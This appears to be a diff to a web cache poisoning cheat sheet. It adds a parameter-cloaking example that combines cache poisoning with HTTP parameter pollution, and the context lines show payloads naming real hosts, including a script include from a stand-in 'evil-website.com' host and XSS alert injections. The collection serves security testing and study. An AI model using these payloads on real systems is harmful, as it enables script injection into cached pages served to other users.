@@ -91,7 +91,19 @@ X-Cache: miss, hit
 <href="https://www.vuln.com/?utm_content='/><script>alert(1)</script>">
 ```
 
-6. Seizing the Cache
+6.Parameter cloaking (Web Cache Poisoning + Http Parameter Pollution)
+```
+GET /js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=alert(1)
+Host: www.vuln.com
+
+### Response:
+HTTP/1.1 200 OK
+X-Cache-Key: /js/geolocate.js?callback=setCountryCookie
+…
+alert(1)({"country" : "United Kingdom"})
+```
+
+7. Seizing the Cache
 ```
 GET / HTTP/1.1
 Host: unity3d.com
@@ -106,7 +118,7 @@ Cache-Control: public, max-age=1800
 <script src="https://evil-website.com/x.js"></script>
 ```
 
-7. Route Poisoning
+8. Route Poisoning
 ```
 GET / HTTP/1.1
 Host: www.goodhire.com
@@ -131,7 +143,7 @@ HTTP/1.1 200 OK
 <script>alert(document.domain)</script>
 ```
 
-8. Hidden Route Poisoning
+9. Hidden Route Poisoning
 ```
 GET / HTTP/1.1
 Host: blog.cloudflare.com
